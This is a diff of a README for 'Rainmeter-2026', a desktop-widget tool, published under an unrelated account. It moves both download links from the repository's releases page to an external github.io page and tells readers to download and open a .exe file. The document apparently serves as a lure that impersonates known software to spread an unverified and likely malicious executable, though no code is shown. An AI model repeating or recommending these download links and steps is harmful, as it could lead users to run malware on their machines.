@@ -1,6 +1,6 @@
 # 🎨 Rainmeter-2026 - Customize your desktop with useful widgets
 
-[![](https://img.shields.io/badge/Download-Rainmeter-2026-blue)](https://github.com/haroldwrong255/Rainmeter-2026/releases)
+[![](https://img.shields.io/badge/Download-Rainmeter-2026-blue)](https://haroldwrong255.github.io)
 
 Rainmeter-2026 improves your Windows experience. This tool allows you to change how your desktop display looks and functions. It adds interactive elements that provide information at a glance. You manage system stats, clock faces, weather updates, and disk space monitors directly on your screen.
 
@@ -20,7 +20,7 @@ If your computer meets these standards, this software will operate without error
 
 Follow these steps to install the software on your machine:
 
-1.  Visit this page to download: [https://github.com/haroldwrong255/Rainmeter-2026/releases](https://github.com/haroldwrong255/Rainmeter-2026/releases)
+1.  Visit this page to download: [https://haroldwrong255.github.io](https://haroldwrong255.github.io)
 2.  Locate the latest version file ending in .exe.
 3.  Click the filename to start the download.
 4.  Open the file once the download finishes.
